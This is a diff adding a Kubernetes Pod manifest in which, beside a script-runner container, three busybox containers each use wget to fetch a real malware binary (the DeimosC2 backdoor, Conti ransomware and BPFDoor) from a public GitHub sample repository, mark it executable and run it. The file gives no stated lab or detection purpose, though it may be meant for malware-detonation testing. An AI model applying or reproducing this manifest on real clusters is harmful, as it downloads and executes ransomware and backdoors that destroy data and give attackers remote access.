@@ -1,0 +1,28 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: busybox-script-runner
+  labels:
+    app: busybox-script
+spec:
+  containers:
+  - name: busybox-script-container
+    image: <your-dockerhub-username>/busybox-script:latest
+    imagePullPolicy: Always
+    command: ["/tmp/busybox_sample_download_script.sh"]
+    volumeMounts:
+    - name: script-volume
+      mountPath: /tmp
+  - name: c2-agent-container
+    image: busybox
+    command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O /tmp/deimosC2.elf && chmod +x /tmp/deimosC2.elf && /tmp/deimosC2.elf"]
+  - name: conti-ransomware-container
+    image: busybox
+    command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O /tmp/conti.elf && chmod +x /tmp/conti.elf && /tmp/conti.elf"]
+  - name: bpfdoor-container
+    image: busybox
+    command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/BPFDoor/07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d.elf.x86_64 -O /tmp/bpfdoor.elf && chmod +x /tmp/bpfdoor.elf && /tmp/bpfdoor.elf"]
+  restartPolicy: Never
+  volumes:
+  - name: script-volume
+    emptyDir: {}
